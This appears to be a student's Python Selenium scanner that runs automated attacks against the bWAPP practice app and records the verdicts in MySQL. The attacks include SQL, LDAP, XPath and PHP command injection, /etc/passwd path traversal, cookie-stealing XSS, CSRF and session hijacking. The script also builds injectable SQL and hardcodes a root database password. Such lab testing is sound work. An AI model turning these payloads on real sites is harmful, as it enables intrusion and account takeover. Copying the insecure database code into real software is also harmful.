from selenium import webdriver
from selenium.common.exceptions import UnexpectedAlertPresentException
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from urllib.parse import unquote
from urllib.request import urlopen
from urllib.error import URLError, HTTPError
import urllib.request
import requests
import time
import base64
import sys
import datetime
from selenium.webdriver.chrome.options import Options
import os
from requests.sessions import session
import json
import pyautogui  # 시크릿모드용
from selenium.webdriver.support.ui import Select  # 드롭다운용
import pymysql
import string
from datetime import datetime
from selenium.webdriver.common.keys import Keys


driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
# Service 객체에 webdriver-manager의 ChromeDriverManager를 사용하여 크롬 드라이버를 다운받은 경로가 아닌 현재 OS에 설치된 크롬 브라우저를 사용하도록 수정
# 매번 chromedriver을 새로 받는 작업을 할 필요X


def login(url):
    urls = url + "/login.php"
    driver.get(urls)
    login = driver.find_element(By.ID, "login")
    login.send_keys("bee")
    passwd = driver.find_element(By.ID, "password")
    passwd.send_keys("bug")
    # driver.find_element(By.TAG_NAME, 'button').send_keys(Keys.ENTER)
    driver.find_element(By.TAG_NAME, "button").send_keys(Keys.ENTER)
    # EC.element_to_be_clickable((By.TAG_NAME, 'button'))


def SI_Login(url):  # SQL Injection
    print("\n[SQL Injection(login)]")
    global si_login_result  # 결과값 넣을 변수
    global si_login_json

    urls = url + "/sqli_3.php"

    inject = [
        "' or 1 = 1 -- ",
        "' or 'a' = 'a' -- ",
        "' or 'a' = 'a' # ",
        "' or 1=1 #",
        "' or '1' ='1",
        "' or ''='",
        "' or 1 = 1 /*",
    ]

    count = 0

    for i in inject:
        driver.get(urls)
        login1 = driver.find_element(By.ID, "login")
        login1.send_keys(i)
        passwd = driver.find_element(By.ID, "password")
        passwd.send_keys("test")
        driver.find_element(By.TAG_NAME, "button").send_keys(Keys.ENTER)
        main = driver.find_element(By.ID, "main")
        services = main.find_elements(By.TAG_NAME, "p")
        for wel in services:
            wel = wel.text
            if "Welcome" in wel:
                count += 1

    if count > 0:
        print("성공한 로그인 횟수 :", count)
        print("SQL Injection(Login) 취약")
        si_login_result = "'risk'"
        si_login_json = "risk"
    else:
        print("SQL Injection(Login) 안전")
        si_login_result = "'safe'"
        si_login_json = "safe"


def SI_Search(url):  # SQL Injection(Search)
    print("\n[SQL Injection(Search)]")
    global si_search_result
    global si_search_json

    urls = url + "/sqli_1.php"
    inject = [
        "'",
        "' or 1 = 1 -- ",
        "' or 'a' = 'a' -- ",
        "' or 'a' = 'a' # ",
        "' or 1=1 #",
        "' or '1' ='1",
        "' or ''='",
        "' or 1 = 1/*",
    ]

    count = 0

    for i in inject:
        driver.get(urls)
        search = driver.find_element(By.ID, "title")
        search.send_keys(i)
        driver.find_element(By.TAG_NAME, "button").send_keys(Keys.ENTER)
        time.sleep(1)
        main = driver.find_element(By.ID, "main")
        try:
            a = main.find_element(
                By.TAG_NAME, "a"
            )  # a 태그가 있다면  #sql 인젝션에 성공하면 영화 주소가 나오기 때문!
            message = a.get_attribute("href")  # get_attribute : 특정 요소의 값 반환
            if ".com" in message:
                count += 1
        except:  # a 태그가 없다면
            continue  # 계속 해라

    if count > 0:
        print("성공한 검색 횟수 :", count)
        print("SQL Injection(Search) 취약")
        si_search_result = "'risk'"
        si_search_json = "risk"
    else:
        print("SQL Injection(Search) 안전")
        si_search_result = "'safe'"
        si_search_json = "safe"


def PHP_CI(url):  # PHP CODE Injection
    print(" \n[PHP CODE Injection]")
    global php_ci_result
    global php_ci_json

    urls = url + "/phpi.php"
    driver.get(urls)
    main = driver.find_element(By.ID, "main")
    a = main.find_element(By.TAG_NAME, "a")
    message = a.get_attribute("href")  # a tag 내의 href 주소 가져오기 (message 내용 클릭 주소)
    # print(message)
    driver.get(message)  # 메세지 내용 클릭
    time.sleep(1)
    current_url = driver.current_url
    if "message=" in current_url:  # 메세지 내용이 주소에 노출된다면
        driver.get(
            current_url + ';system("ls -l")'
        )  # ls -l 명령어 실행   # 커맨드 인젝션 : 사용자가 취약한 웹사이트의 입력 폼이나 기타 방법을 이용하여 서버에 직접적, 간접적으로 명령어(Bash, CMD 등)를 전송하여 실행시키는 공격 방법
        # system() : 웹 애플리케이션에서 사용자 입력을 기반으로 system(), exec(), os.system() 등 시스템 호출 함수
        # 이 함수는 웹서버의 권한으로 호출되기 때문에 일반 사용자보다 높은 권한으로 실행될 수 있으며 일반적으로 읽지 못하는 파일이나 디렉토리를 읽을 수 있음
        ls = driver.find_element(By.ID, "main")
        # print(ls.text)
        if "root" in ls.text:  # 출력된 내용에 root가 있다면
            print("PHP CODE Injection 취약")  # 취약
            php_ci_result = "'risk'"
            php_ci_json = "risk"
        else:
            print("PHP CODE Injection 안전")
            php_ci_result = "'safe'"
            php_ci_json = "safe"


def AE(url):  # 관리자 페이지 노출
    print(" \n[관리자 페이지 노출]")
    global ae_result
    global ae_json

    count = 0
    ad_p = [
        "/admin",
        "/administartor",
        "/masterpage",
        "webmaster",
        "/adm",
        "/manager",
        "/master",
    ]
    for link in ad_p:
        try:
            res = urlopen(url + link)
            if res.status == 206:  # res.status : http 응답코드 가져오기
                # #getcode() : http 응답상태 가져오기도 가능함, 하지만 얘는 주로 오류 상태코드를 가져올 때 사용
                print(url + link, "는 취약합니다.")
                count += 1
        except (
            HTTPError
        ) as e:  # (404)에러를 위한 except 문  #HTTPError : 페이지를 찾을 수 없거나, URL 해석에서 에러가 생긴 경우
            code = e.getcode()  # getcode() : http 응답상태 가져오기
            if code != 206:  # 404 에러 발생 시 continue
                continue
    if count > 0:
        print("관리자페이지 노출 취약")
        ae_result = "'risk'"
        ae_json = "risk"
    else:
        print("관리자페이지 노출 안전")
        ae_result = "'safe'"
        ae_json = "safe"


def DL(url):  # 디렉터리 리스팅
    print("\n[디렉터리 리스팅]")
    global dl_result
    global dl_json

    count = 0
    urls = url + "/directory_traversal_1.php?page=message.txt"
    driver.get(urls)
    go_url = ""
    for x in urls:  # url 문자 하나씩 불러오기
        if x != "=":
            go_url = go_url + x  # 한 문자씩 go_url에 추가
        else:  # = 라면
            go_url = go_url + "="  # go_url에 = 추가하고
            break  # for문 멈추기

    risk = "/../../../../../../../../../../etc/passwd"
    risk_url = go_url + risk
    driver.get(risk_url)
    time.sleep(1)
    main = driver.find_element(By.ID, "main")
    if "root" in main.text:
        print(risk_url, "에 접속 가능합니다.")
        count += 1

    if count > 0:
        print("디렉터리 리스팅 취약")
        dl_result = "'risk'"
        dl_json = "risk"
    else:
        print("디렉터리 리스팅 안전")
        dl_result = "'safe'"
        dl_json = "safe"


def XSS_Stored(url):  # Stored XSS
    print("\n[Stored XSS]")
    global xss_stored_result
    global xss_stored_json

    re = url + "/reset.php"
    driver.get(re)  # 지금까지 코드 짜기 위해 실습 돌린 것들을 초기화하기 위해 넣은 reset 코드(reset page로 이동)

    urls = url + "/htmli_stored.php"  # 여기부터가 진짜 시작
    driver.get(urls)
    entry = driver.find_element(By.ID, "entry")
    entry.send_keys(
        "Hi :D <script>alert(document.cookie)</script>"
    )  # 사용자의 쿠키 정보를 볼 수 있는 악의적인 구문 삽입
    # <script> 태그 안쪽에 있는 코드를 자바스크립트로 해석해서 동작함

    driver.find_element(By.TAG_NAME, "button").send_keys(Keys.ENTER)
    time.sleep(1)
    alert = driver.switch_to.alert  # 경고창 가져오기
    if "PHPSESSID=" in alert.text:
        alert.accept()  # 경고창 닫기

        driver.get(url)  # 기본 페이지
        time.sleep(1)
        driver.get(urls)  # XSS 코드를 넣은 글이 있는 블로그 접속
        time.sleep(1)
        alert2 = driver.switch_to.alert
        if "PHPSESSID=" in alert2.text:  # 알림창에 알림이 뜬다면
            print("Stored XSS 취약")
            time.sleep(1)
            xss_stored_result = "'risk'"
            xss_stored_json = "risk"
            alert2.accept()  # 경고창 닫기

    else:
        print("Stored XSS 안전")
        xss_stored_result = "'safe'"
        xss_stored_json = "safe"


def SF(url):  # 세션 고정 취약점
    print("\n[세션 고정 취약점]")
    global sf_result
    global sf_json

    driver.get(url)

    cookie1 = driver.get_cookie("PHPSESSID")
    cookie_s1 = cookie1["value"]
    print(cookie_s1)

    logout = url + "/logout.php"
    driver.get(logout)
    time.sleep(1)  # 로그아웃하기

    # 다시 로그인 하기
    login(url)
    time.sleep(1)

    cookie2 = driver.get_cookie("PHPSESSID")
    cookie_s2 = cookie2["value"]
    print(cookie_s2)

    if cookie_s1 == cookie_s2:
        print("세션 고정 취약")
        sf_result = "'risk'"
        sf_json = "risk"
    else:
        print("세션 고정 안전")
        sf_result = "'safe'"
        sf_json = "safe"


def Cookie(url):
    print("\n[Cookie 변조 취약점]")
    global cookie_result
    global cookie_json

    # 관리자 계정으로 로그인
    # login(url) #굳이 없어도 되기는 함
    driver.get(url)
    time.sleep(1)

    # 관리자 계정의 쿠키값 가져오기
    cookie = driver.get_cookie("PHPSESSID")
    cookie_a = cookie["value"]
    # print(cookie_a)

    # test 계정으로 로그인하기
    url1 = url + "/login.php"
    pyautogui.hotkey("ctrl", "shift", "n")  # 시크릿모드로 열기
    time.sleep(1)

    # 새로 열린 창으로 전환
    driver.switch_to.window(driver.window_handles[1])
    driver.get(url1)
    login1 = driver.find_element(By.ID, "login")  # 다른 계정으로 로그인
    login1.send_keys("test")
    passwd1 = driver.find_element(By.ID, "password")
    passwd1.send_keys("success")
    driver.find_element(By.TAG_NAME, "button").send_keys(Keys.ENTER)
    time.sleep(1)

    cookie2 = driver.get_cookie("PHPSESSID")
    cookie_t = cookie2["value"]
    # print(cookie_t)

    # test계정의 쿠키값을 관리자 쿠키값으로 변경
    cookie_t = cookie_a
    # print(cookie_r2)

    # 쿠키 지우기
    driver.delete_cookie("PHPSESSID")
    # 현재 브라우저에 쿠키 추가
    # print(driver.get_cookies())
    # 쿠키 추가하기(변경하기)
    driver.add_cookie({"name": "PHPSESSID", "value": f"{cookie_t}"})
    # print(driver.get_cookies())

    # 새로고침
    driver.refresh()
    time.sleep(2)

    # welcome bee 있는지 확인하기
    main = driver.find_element(By.ID, "menu")
    td = main.find_elements(By.TAG_NAME, "td")

    # 메뉴 바에 bee로 바뀌었는지 확인하기 위해 크롤링
    for bee in td:
        bee = bee.text

    # bee로 바뀌었다면 취약, 아니라면 안전
    if "Bee" in bee:
        print("Cookie 변조 취약")
        cookie_result = "'risk'"
        cookie_json = "risk"
    else:
        print("Cookie 변조 안전")
        cookie_result = "'safe'"
        cookie_json = "safe"

    # 새창 닫기
    driver.close()
    # 원래 창으로 이동
    driver.switch_to.window(driver.window_handles[0])


def Redirect(url):
    print("\n[Redirect 취약점]")
    global redirect_result
    global redirect_json

    url = url + "/unvalidated_redir_fwd_1.php"

    driver.get(url)
    time.sleep(1)
    selectbox = Select(driver.find_element(By.TAG_NAME, "select"))
    selectbox.select_by_index(0)  # 첫번째 인덱스값 선택
    driver.find_element(By.TAG_NAME, "button").send_keys(Keys.ENTER)
    time.sleep(2)

    # 원래 페이지로 이동
    driver.get(url)
    time.sleep(2)

    # select 안에 있는 옵션들 가져오기
    select = driver.find_element(By.TAG_NAME, "select")
    options = select.find_elements(By.TAG_NAME, "option")

    for option in options:
        value = option.get_attribute("value")  # get_attribute : 특정 요소의 값 반환
        # 속성값을 value에 저장  #주소들이 저장됨
        if value != "http://192.168.75.128/bWAPP/user_extra.php":
            driver.execute_script(
                "arguments[0].value = 'http://192.168.75.128/bWAPP/user_extra.php'",
                option,
            )
            # option 변수는 execute_script 메소드의 첫 번째 인수로 전달되어 자바스크립트 코드에서 arguments[0]로 참조
            # 따라서 option 변수가 가리키는 페이지 요소의 값이 '중부대 주소'로 설정
            # option은 arguments[0] = 중부대 주소 로 참조
            # option 변수가 가리키는 페이지 요소의 값을 중부대 주소로 설정

    selectbox = Select(driver.find_element(By.TAG_NAME, "select"))
    selectbox.select_by_index(0)  # 첫번째 인덱스값 선택
    driver.find_element(By.TAG_NAME, "button").send_keys(Keys.ENTER)
    time.sleep(2)
    current_url = driver.current_url

    if (
        current_url == "http://192.168.75.128/bWAPP/user_extra.php"
    ):  # 현재 페이지가 중부대학교 졸업작품 페이지면 취약
        print("Redirect 취약")
        redirect_result = "'risk'"
        redirect_json = "risk"
    else:
        print("Redirect 안전")
        redirect_result = "'safe'"
        redirect_json = "safe"


def CSRF(url):  # CSRF
    print("\n[CSRF]")
    global csrf_result
    global csrf_json

    logout = url + "/logout.php"
    driver.get(logout)
    time.sleep(1)  # 로그아웃하기

    create = url + "/user_new.php"  # 사용자 생성 #student14
    driver.get(create)
    id = driver.find_element(By.ID, "login")
    id.send_keys("student206")  # 변경!!
    email = driver.find_element(By.ID, "email")
    email.send_keys("student206@new.com")  # 변경!!
    passwd = driver.find_element(By.ID, "password")
    passwd.send_keys("test")
    passwd_conf = driver.find_element(By.ID, "password_conf")
    passwd_conf.send_keys("test")
    secret = driver.find_element(By.ID, "secret")
    secret.send_keys("hi")
    driver.find_element(By.TAG_NAME, "button").send_keys(Keys.ENTER)
    time.sleep(1)

    driver.get(url + "/login")  # 만든 계정으로 로그인 #student14 로그인
    log_in = driver.find_element(By.ID, "login")
    log_in.send_keys("student206")  # 변경!!
    passwd = driver.find_element(By.ID, "password")
    passwd.send_keys("test")
    driver.find_element(By.TAG_NAME, "button").send_keys(Keys.ENTER)
    time.sleep(1)

    urls = url + "/csrf_1.php"  # 비밀번호 변경
    driver.get(urls)
    passwd_new = driver.find_element(By.ID, "password_new")
    passwd_new.send_keys("testing")
    passwd_conf2 = driver.find_element(By.ID, "password_conf")
    passwd_conf2.send_keys("testing")
    driver.find_element(By.TAG_NAME, "button").send_keys(Keys.ENTER)
    time.sleep(1)

    current_url = driver.current_url

    if "testing" in current_url:  # 비밀번호가 현재 url에 노출된다면 csrf 공격시도
        re = url + "/reset.php"
        driver.get(re)  # xss_stored 코드 초기화하기 위해 넣은 reset 코드(reset page로 이동)

        blog = url + "/htmli_stored.php"  # 블로그 글쓰기 창으로 이동
        driver.get(blog)
        attack = f'<img src="{current_url}" width="0" height="0">'  # f 문자열 이용 #포매팅할 위치에 있는 변수를 {}로 감싸기
        # <img>태그는 html 문서에서 이미지를 정의할 때 사용
        # <img>요소로 정의된 이미지는 html 문서에 이미지가 링크되는 형태
        # 따라서 <img> 태그의 src 속성을 이용해 악의적인 url을 불러옴
        # width="0" height="0"로 크기를 숨겨 내용이 안보이게 입력함

        new_str = attack.replace("testing", "success")  # 비밀번호를 success로 변경, 공격구문

        entry = driver.find_element(By.ID, "entry")
        entry.send_keys(new_str)  # 공격 구문 삽입
        driver.find_element(By.TAG_NAME, "button").send_keys(Keys.ENTER)
        time.sleep(1)

        check = url + "/sqli_16.php"  # 비밀번호 변경 확인
        driver.get(check)
        input_box = driver.find_element(By.ID, "login")
        input_box.send_keys("student206")  # 변경!!!
        input_box2 = driver.find_element(By.ID, "password")
        input_box2.send_keys("testing")
        driver.find_element(By.TAG_NAME, "button").send_keys(Keys.ENTER)
        time.sleep(1)

        main = driver.find_element(By.ID, "main")
        fonts = main.find_elements(By.TAG_NAME, "font")

        for val in fonts:
            val = val.text

    if "Invalid" in val:
        print("CSRF 취약")
        csrf_result = "'risk'"
        csrf_json = "risk"
    else:
        csrf_result = "'safe'"
        csrf_json = "safe"
        print("CSRF 안전")

    login(url)  # 다시 로그인


# XML/XPath Injection
def XML_XPATH(url):
    print("\n[XML/XPath 인젝션]")
    global XX_result
    global XX_json
    count = 0

    XX = url + "/xmli_2.php"

    lines = XX + "?genre=')]|//*|XX[('"  # //* : 현재 노드로부터 모든 노드 조회

    driver.get(lines)
    main = driver.find_element(By.ID, "main")
    if "neo" in main.text:
        count += 1

    if count > 0:
        print(count, "취약")
        XX_result = "'risk'"
        XX_json = "risk"
    else:
        print("안전")
        XX_result = "'safe'"
        XX_json = "safe"


# 약한 문자열 강도
def BF(url):
    print("\n[약한 문자열 강도]")
    global BF_result
    global BF_json
    count = 0

    force = url + "/ba_insecure_login_1.php"

    IDs = [
        "adminstrator",
        "manager",
        "guest",
        "admin",
        "test",
        "user",
        "id",
        "tonystark",
    ]

    passwds = [
        "Abcd",
        "aaaa",
        "admin",
        "test",
        "1234",
        "1111",
        "password",
        "I am Iron Man",
    ]

    for id in IDs:
        for pw in passwds:
            driver.get(force)
            input_box = driver.find_element(By.ID, "login")
            input_box.send_keys(id)
            input_box2 = driver.find_element(By.ID, "password")
            input_box2.send_keys(pw)
            driver.find_element(By.TAG_NAME, "button").send_keys(Keys.ENTER)
            main = driver.find_element(By.ID, "main")
            font = main.find_elements(By.TAG_NAME, "font")
            for fo in font:
                if "Successful" in fo.text:
                    count += 1

    if count > 0:
        print(count, "취약")
        BF_result = "'risk'"
        BF_json = "risk"
    else:
        BF_result = "'safe'"
        BF_json = "safe"


# Broken Auth - Insecure Login Forms
def BA(url):
    print("\n[Broken Auth - Insecure Login Forms]")
    global BA_result
    global BA_json
    count = 0

    ILF = url + "/ba_insecure_login_1.php"

    lines = []
    driver.get(ILF)

    main = driver.find_element(By.ID, "main")
    font = main.find_elements(By.TAG_NAME, "font")
    for element in font:
        lines.append(element.text)  # font에 있는거 lines에 넣기
    input_box = driver.find_element(By.ID, "login")
    input_box.send_keys(lines[0])
    input_box2 = driver.find_element(By.ID, "password")
    input_box2.send_keys(lines[1])
    driver.find_element(By.TAG_NAME, "button").send_keys(Keys.ENTER)
    main_s = driver.find_element(By.ID, "main")
    font_s = main_s.find_elements(By.TAG_NAME, "font")
    for Suc in font_s:
        if "Successful" in Suc.text:
            count += 1

    if count > 0:
        print("취약")
        BA_result = "'risk'"
        BA_json = "risk"
    else:
        print("안전")
        BA_result = "'safe'"
        BA_json = "safe"


# Insecure DOR(Change Secret)
def DOR(url):
    print("\n[Insecure DOR(Change Secret)]")
    global DOR_result
    global DOR_json

    count = 0

    create = url + "/user_new.php"  # user 생성

    driver.get(create)
    id = driver.find_element(By.ID, "login")
    id.send_keys("user206")  # 변경!
    email = driver.find_element(By.ID, "email")
    email.send_keys("user206@a.com")  # 변경!
    passwd = driver.find_element(By.ID, "password")
    passwd.send_keys("bbb")
    passwd_conf = driver.find_element(By.ID, "password_conf")
    passwd_conf.send_keys("bbb")
    secret = driver.find_element(By.ID, "secret")
    secret.send_keys("hi")
    time.sleep(1)
    driver.find_element(By.TAG_NAME, "button").send_keys(Keys.ENTER)
    time.sleep(1)

    IDOR = url + "/insecure_direct_object_ref_1.php"  # serect 변경
    driver.get(IDOR)
    inputs = driver.find_elements(By.TAG_NAME, "input")
    for input_element in inputs:
        value = input_element.get_attribute("value")  # 속성값 value에 저장
        if value == "bee":
            print(
                input_element.get_attribute("outerHTML")
            )  # get_attribute : 특정 요소의 값 반환
            driver.execute_script(
                "arguments[0].value = 'user206'", input_element
            )  # 변경!
            print(
                input_element.get_attribute("outerHTML")
            )  # 요소 자체와 그 요소의 모든 자식 요소를 포함한 HTML 코드를 반환
            input_box = driver.find_element(By.ID, "secret")
            input_box.send_keys("change")
            time.sleep(1)
            driver.find_element(By.NAME, "action").send_keys(Keys.ENTER)
            time.sleep(3)

            check = url + "/sqli_16.php"
            driver.get(check)

            input_box = driver.find_element(By.ID, "login")  # 로그인
            input_box.send_keys("user206")  # 변경!
            input_box2 = driver.find_element(By.ID, "password")
            input_box2.send_keys("bbb")
            driver.find_element(By.TAG_NAME, "button").send_keys(Keys.ENTER)
            time.sleep(3)

            main = driver.find_element(By.ID, "main")  # 변경확인
            b = main.find_elements(By.TAG_NAME, "b")
            for Suc in b:
                if "change" in Suc.text:
                    count += 1
    if count == 0:
        print(count, "취약")
        DOR_result = "'risk'"
        DOR_json = "risk"
    else:
        print("안전")
        DOR_result = "'safe'"
        DOR_json = "safe"


# Base64 Encoding(Secret)
def Base(url):
    print("\n[Base64 Encoding(Secret))]")
    global Base_result
    global Base_json
    count = 0

    IB = url + "/insecure_crypt_storage_3.php"
    driver.get(IB)

    cookies = driver.get_cookies()  # 쿠키 가져오기
    cookie_list = []
    for cookie in cookies:
        cookie_list.append([cookie["name"], cookie["value"]])  # 쿠키가 딕셔너리 리스트 형식이라 따로 가능

    # URL 디코딩
    encoded_text = cookie_list[0][1]  # secret꺼 들어옴
    decoded_text = unquote(encoded_text)

    # Base64 디코딩
    Base_decoded = base64.b64decode(decoded_text)
    str = Base_decoded.decode("UTF-8")
    if str == "Any bugs?":
        print("취약")
        Base_result = "'risk'"
        Base_json = "risk"
    else:
        print("안전")
        Base_result = "'safe'"
        Base_json = "safe"


# Restrict Folder Access  뭔지 알기
def RFA(url):
    print("\n[Restrict Folder Access]")
    global RFA_result
    global RFA_json
    count = 0

    new = url + "/restrict_folder_access.php"
    driver.get(new)

    main = driver.find_element(By.ID, "main")
    try:  # a태그 찾아 첫번째껄로 들어가기
        a = main.find_element(By.TAG_NAME, "a")
        message = a.get_attribute("href")
        driver.execute_script("window.open('');")  # 새 탭 열기
        driver.switch_to.window(driver.window_handles[1])  # 새 탭으로 전환
        driver.get(message)  # 새 탭에서 웹페이지 열기
        original_url = driver.current_url  # 현재의 웹페이지의 URL 저장
        time.sleep(2)
        driver.switch_to.window(driver.window_handles[0])  # 비박스로 다시 이동
        time.sleep(2)
        logout = url + "/logout.php"
        driver.get(logout)
        time.sleep(1)  # 로그아웃하기
        driver.switch_to.window(driver.window_handles[1])  # pdf로 다시 이동
        time.sleep(1)
        driver.refresh()
        new_url = driver.current_url  # 웹페이지의 URL 새로 저장

        if original_url == new_url:  # 웹페이지가 바뀌었는지 확인 - 원래꺼랑 같으면 취약 다르면 안전
            print("안바뀜-취약")
            RFA_result = "'risk'"
            RFA_json = "risk"
        else:
            print("바뀜-안전")
            RFA_result = "'safe'"
            RFA_json = "safe"

    except:
        print("no")

    driver.close()
    # 원래 창으로 이동
    driver.switch_to.window(driver.window_handles[0])


# Old, Backup & Unreferenced Files  코드수정
def SM(url):
    print("\n[Security Misconfiguration]")
    global SM_result
    global SM_json
    count = 0

    # 원래의 php에 접근을 안해도 접근이 가능
    risk = url + "/config.inc"  # DB파일
    response = requests.get(risk)
    source_code = response.text

    if "server" in source_code and "username" in source_code:
        print("취약")
        SM_result = "'risk'"
        SM_json = "risk"
    else:
        print("안전")
        SM_result = "'safe'"
        SM_json = "safe"


# LDAP Injection
def LDAP(url):  # 구문의미 알기
    print("\n[LDAP Injection]")
    global LDAP_result
    global LDAP_json
    count = 0

    login(url)
    AP = url + "/sqli_3.php"

    lines = [
        "*",
        "admin)(&))",
        "*)(&",
        ")(cn=*))",
        "*()|&'",
        "*(|(objectclass=*))",
        "*)(uid=*))(|(uid=*",
        "admin*)((|userpassword=*)" "(& (USER = *) (&)",
        "admin)(password=*",
    ]

    for payload in lines:
        driver.get(AP)
        input_box = driver.find_element(By.ID, "login")
        input_box.send_keys(payload)
        input_box2 = driver.find_element(By.ID, "password")
        input_box2.send_keys("test")
        driver.find_element(By.TAG_NAME, "button").send_keys(Keys.ENTER)
        main = driver.find_element(By.ID, "main")
        services = main.find_elements(By.TAG_NAME, "p")
        for wel in services:
            if "Welcome" in wel.text:
                count += 1
    if count > 0:
        print("취약")
        LDAP_result = "'risk'"
        LDAP_json = "risk"
    else:
        print("안전")
        LDAP_result = "'safe'"
        LDAP_json = "safe"


# Blind SQL
def BS(url):
    print("\n[Blind SQL]")
    global BS_result
    global BS_json
    count = 0

    BB = url + "/sqli_4.php"
    driver.get(BB)
    time.sleep(1)

    # 사용하는 구문
    line = [
        "' or 1=1 #",
        "' or 1=1 and length(database())={a}#",  # 5가 정답
        "' or 1=1 and substring(database(),{c},1)='{b}'#",  # #bwapp가 정답
    ]

    input_box = driver.find_element(By.ID, "title")
    input_box.send_keys(line[0])
    driver.find_element(By.TAG_NAME, "button").send_keys(Keys.ENTER)
    main = driver.find_element(By.ID, "main")
    movie = main.text
    if "The movie exists in our database!" in movie:
        count += 1

    a = 0
    success = False
    while not success:
        input_box = driver.find_element(By.ID, "title")
        bb = f"' or 1=1 and length(database())={a}#"  # 업데이트위해 f 필요
        input_box.send_keys(bb)
        driver.find_element(By.TAG_NAME, "button").send_keys(Keys.ENTER)
        main = driver.find_element(By.ID, "main")
        movie = main.text
        if "The movie exists in our database!" in movie:
            count += 1
            success = True
        else:
            a += 1

    ex = ""
    c = 1
    while c <= a:
        # c값에 따라 b를 대문자로 할건지 소문자로 할건지 정해짐
        b = string.ascii_lowercase if c == 1 else string.ascii_uppercase
        for letter in b:
            input_box = driver.find_element(By.ID, "title")
            line[2] = f"' or 1=1 and substring(database(),{c},1)='{letter}'#"
            input_box.send_keys(line[2])
            driver.find_element(By.TAG_NAME, "button").send_keys(Keys.ENTER)
            main = driver.find_element(By.ID, "main")
            movie = main.text
            if "The movie exists in our database!" in movie:
                ex += letter
                c += 1
                break
    print(ex)

    if count > 0:
        print("취약")
        BS_result = "'risk'"
        BS_json = "risk"
    else:
        print("안전")
        BS_result = "'safe'"
        BS_json = "safe"


# XSS
def XSS(url):
    print("\n[XSS]")
    global XSS_result
    global XSS_json
    count = 0

    XSS = url + "/xss_login.php"

    lines = [
        "' or <svg/onload=alert('XSS 1')>",
        "' or <script>alert('XSS 2')</script>",
        "'; <script>alert('XSS 3')</script>",
        "' or <body onload=alert('XSS 4')>",
        "<img src=x onerror=\"alert('XSS 5')\">",
        "<iframe src=\"javascript:alert('XSS 6');\"></iframe>",
    ]

    count = 0
    for payload in lines:
        try:
            driver.get(XSS)
            input_box = driver.find_element(By.ID, "login")
            input_box.send_keys(payload)
            time.sleep(1)
            driver.find_element(By.TAG_NAME, "button").send_keys(Keys.ENTER)
            driver.get(XSS)  # 한 번 해야지 구문에 맞게 인식 -> alert 확인을 위해서
        except UnexpectedAlertPresentException:
            time.sleep(1)
            count += 1

    if count > 0:
        print("XSS 취약")
        XSS_result = "'risk'"
        XSS_json = "risk"
    else:
        print("XSS 안전")
        XSS_result = "'safe'"
        XSS_json = "safe"


def db(url):
    url = f"'{url}'"
    now = f"'{datetime.now()}'"

    conn = pymysql.connect(
        host="127.0.0.1", user="root", password="283400aa", database="dev"
    )

    # 커서 생성
    cursor = conn.cursor()

    # SELECT 명령어 실행
    # cursor.execute("delete from tools;")
    cursor.execute(
        f"INSERT INTO tools VALUES ({url}, {si_login_result}, {si_search_result}, {php_ci_result}, {ae_result}, {dl_result}, {xss_stored_result}, {sf_result}, {cookie_result}, {redirect_result}, {csrf_result}, {BF_result}, {LDAP_result}, {XX_result}, {BA_result}, {DOR_result}, {Base_result}, {RFA_result}, {XSS_result}, {SM_result}, {BS_result}, {now});"
    )
    cursor.execute("select * from tools;")

    # result = cursor.fetchone()
    row = cursor.fetchall()

    conn.commit()
    conn.close()

    # print(result)
    # 조회 결과 전부 출력

    for i in row:
        url = []
        url = i
        print(url)


def json_web(user_id, url):
    now = f"{datetime.now()}"

    user_id = f"'{user_id}'"

    json_context = {
        "url": url,
        "SI_Login": si_login_json,
        "SI_Search": si_search_json,
        "PHP_CI": php_ci_json,
        "AE": ae_json,
        "DL": dl_json,
        "XSS_Stored": xss_stored_json,
        "SF": sf_json,
        "Cookie": cookie_json,
        "Redirect": redirect_json,
        "CSRF": csrf_json,
        "XML_XPATH": XX_json,
        "BF": BF_json,
        "BA": BA_json,
        "DOR": DOR_json,
        "Base": Base_json,
        "RFA": RFA_json,
        "SM": SM_json,
        "LDAP": LDAP_json,
        "BS": BS_json,
        "XSS": XSS_json,
        "time": now,
    }

    json_string = json.dumps(json_context, indent=4, ensure_ascii=False)
    url = f"'{url}'"
    json_string = f"'{json_string}'"

    conn = pymysql.connect(
        host="127.0.0.1", user="root", password="283400aa", database="dev"
    )

    cursor = conn.cursor()
    # cursor.execute(f"INSERT INTO json_db VALUES ({json_string});")

    cursor.execute(
        f"select MAX(num) from results_info where id = {user_id} && url = {url};"
    )
    row = cursor.fetchone()
    for i in row:
        num = i
        print(num)

    cursor.execute(
        f"UPDATE results_info SET results = {json_string} WHERE num = {num};"
    )
    cursor.execute("select * from results_info;")
    conn.commit()

    row2 = cursor.fetchall()
    # print(result)
    # 조회 결과 전부 출력

    for i in row2:
        res = i
        print(res)

    conn.close()


def capstone(url):
    login(url)  # 비박스 로그인
    SI_Login(url)  # SQL 인젝션(로그인)
    SI_Search(url)  # SQL 인젝션(검색)
    PHP_CI(url)  # PHP CODE 인젝션
    AE(url)  # 관리자 페이지 노출
    DL(url)  # 디렉터리 리스팅
    XSS_Stored(url)  # Stored XSS
    SF(url)  # 세션고정 취약점
    Cookie(url)  # 쿠키 변조 취약점
    Redirect(url)  # 리다이렉트 취약점
    CSRF(url)  # CSRF
    XML_XPATH(url)  # XML/XPath Injection
    BF(url)  # 약한 문자열 강도
    BA(url)  # Broken Auth - Insecure Login Forms
    DOR(url)  # Insecure DOR(Change Secret)
    Base(url)  # Base64 Encoding(Secret)
    RFA(url)  # Restrict Folder Access
    SM(url)  # Security Misconfiguration
    LDAP(url)  # LDAP Injection
    BS(url)  # Blind SQL
    XSS(url)  # XSS


if __name__ == "__main__":
    # url = 'http://192.168.75.128//bWAPP' #윈도우에서 수정해야함
    user_id = sys.argv[1]
    url = sys.argv[2]
    # 이제 url 변수에 JavaScript에서 전달한 URL 값이 저장되어 있습니다.
    # 이 값을 사용하여 파이썬 코드를 실행시킬 수 있습니다.
    capstone(url)
    # db(url)
    json_web(user_id, url)
    driver.quit()
